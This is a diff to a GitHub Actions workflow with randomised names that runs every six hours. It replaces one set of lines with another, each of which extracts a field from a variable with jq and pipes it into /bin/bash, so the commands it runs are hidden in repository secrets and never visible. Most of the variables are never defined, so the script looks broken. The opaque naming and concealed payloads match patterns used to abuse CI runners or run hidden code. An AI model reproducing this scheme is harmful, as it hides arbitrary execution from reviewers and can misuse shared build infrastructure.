@@ -2,9 +2,9 @@ name: cxxkha
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '33 0/6 * * *'
 
-jobs:  # 26308
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +12,16 @@ jobs:  # 26308
       - uses: actions/checkout@v4
       - name: cxxkha
         env:
-          jylr785: ${{ secrets.jylr785 }}
+          qs0892: ${{ secrets.qs0892 }}
         run: |
-          echo $jylr785 | jq -r .jns95 | /bin/bash
-          echo $fjvct32 | jq -r .lg7414 | /bin/bash
-          echo $m5 | jq -r .yysp72 | /bin/bash
-          echo $kz55 | jq -r .dacdn5919 | /bin/bash
-          echo $qboaq5 | jq -r .h9 | /bin/bash
-          echo $zykph44034 | jq -r .up53030 | /bin/bash
-          echo $iu9 | jq -r .oiprh3165 | /bin/bash
-          echo $hhgq5736 | jq -r .xkkg9231 | /bin/bash
-          echo $fokn23 | jq -r .dm9 | /bin/bash
-          echo $pp1811 | jq -r .f107 | /bin/bash
-          echo $zojo91143 | jq -r .jmq92 | /bin/bash
-          echo $rxn5516 | jq -r .t77268 | /bin/bash
-          echo $tsoh2805 | jq -r .kbf7 | /bin/bash
+          echo $qs0892 | jq -r .sxt122 | /bin/bash
+          echo $vkvf47 | jq -r .wmgr33 | /bin/bash
+          echo $qbi1601 | jq -r .f76 | /bin/bash
+          echo $rpjl310 | jq -r .ews9551 | /bin/bash
+          echo $sirph3239 | jq -r .ohb0 | /bin/bash
+          echo $i1018 | jq -r .arg53719 | /bin/bash
+          echo $ovw973 | jq -r .xdq80 | /bin/bash
+          echo $bfn363 | jq -r .p0 | /bin/bash
+          echo $dn43 | jq -r .p0 | /bin/bash
+          echo $moo108 | jq -r .bijcm7 | /bin/bash
 
